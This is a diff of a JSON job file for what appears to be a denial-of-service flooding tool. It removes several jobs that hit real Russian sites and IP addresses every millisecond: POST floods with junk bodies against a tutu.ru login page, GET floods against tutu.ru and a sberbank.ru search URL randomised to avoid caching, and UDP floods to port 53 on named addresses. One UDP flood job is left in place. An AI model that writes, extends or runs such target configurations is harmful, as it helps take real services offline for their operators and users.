@@ -1,66 +1,6 @@
 {
   "jobs": [
     {
-      "type": "http",
-      "args": {
-        "interval_ms": 1,
-        "method": "POST",
-        "path": "http://tutu.ru/login",
-        "headers": {
-          "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
-        },
-        "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "interval_ms": 1,
-        "method": "GET",
-        "path": "http://tutu.ru"
-      }
-    },
-    {
-      "type": "udp",
-      "args": {
-        "address": "194.54.14.186:53",
-        "interval_ms": 1,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "udp",
-      "args": {
-        "address": "194.54.14.187:53",
-        "interval_ms": 1,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "udp",
-      "args": {
-        "address": "194.67.7.1:53",
-        "interval_ms": 1,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "udp",
-      "args": {
-        "address": "194.67.2.109:53",
-        "interval_ms": 1,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "method": "GET",
-        "path": "https://www.sberbank.ru/ru/search?searchid={{ random_uuid }}&l10n=ru&reqenc=&text={{ random_uuid }}",
-        "headers": {}
-      }
-    },
-    {
       "type": "udp",
       "args": {
         "address": "80.87.198.26:53",
